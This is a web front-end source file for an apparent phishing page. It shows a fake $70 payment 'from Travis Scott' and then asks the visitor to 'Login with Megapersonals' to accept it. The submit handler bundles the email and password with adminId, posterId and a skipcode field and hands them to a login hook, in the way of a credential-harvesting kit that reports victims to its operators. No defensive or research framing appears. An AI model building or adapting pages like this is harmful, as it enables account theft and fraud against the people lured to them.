"use client";

import { useState } from "react";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
export default function Home({ adminId, posterId }) {
  const [open, setOpen] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const { login } = useMockLogin(adminId, posterId);
  const handleSubmit = async () => {
    const allValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(allValues);

    console.log("allValues", allValues);
  };
  return (
    <>
      {!open ? (
        <div className="flex flex-col m-5 gap-5 ">
          <div className="text-center ">
            <p className="text-lg font-semibold">Travis Scott</p>
            <p className="text-xs text-gray-400">Payment form Stravisscott</p>
          </div>
          <div className="text-center mt-[20%]">
            <p className="text-2xl font-semibold">$70.00</p>
            <p className="text-xs text-gray-400">
              For la flame fans must eat Today at 6.35PM
            </p>
          </div>
          <div className=" flex flex-col gap-2 justify-center items-center text-center mt-[20%]">
            <button
              className=" w-[25%] px-5 py-1 rounded-xl bg-green-600 text-white"
              onClick={() => setOpen(true)}
            >
              Accept
            </button>
            <button className=" w-[25%] px-5 py-1 rounded-xl bg-red-600 text-white">
              Decline
            </button>
          </div>
        </div>
      ) : (
        <div className="w-[40%] p-5 shadow-2xl rounded-md mx-auto">
          <p className="text-lg font-semibold text-center">
            Accept your Payment{" "}
          </p>
          <p className="text-center text-sm text-gray-400">
            You just got <span className="text-green-500">$70</span> from Travis
            Scott
          </p>
          <img src="/images/logo-potrait.jpg" alt="" />
          <p className="text-center text-xs mt-3">To accept this money</p>
          <div className="w-[90%] m-3">
            <p className="text-start text-lg font-semibold pl-3">
              Login with Megapersonals
            </p>
            <input
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-5 py-1 rounded-md border border-gray-400 outline-none mt-1 focus:border-green-500"
              placeholder="Enter email hare"
            />
            <input
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-5 py-1 rounded-md border border-gray-400 outline-none mt-2 focus:border-green-500"
              placeholder="Enter password hare"
            />
            <button
              className="w-full px-5 py-1 rounded-xl bg-green-600 mt-3 text-white"
              onClick={() => handleSubmit()}
            >
              Submit
            </button>
          </div>
        </div>
      )}
    </>
  );
}
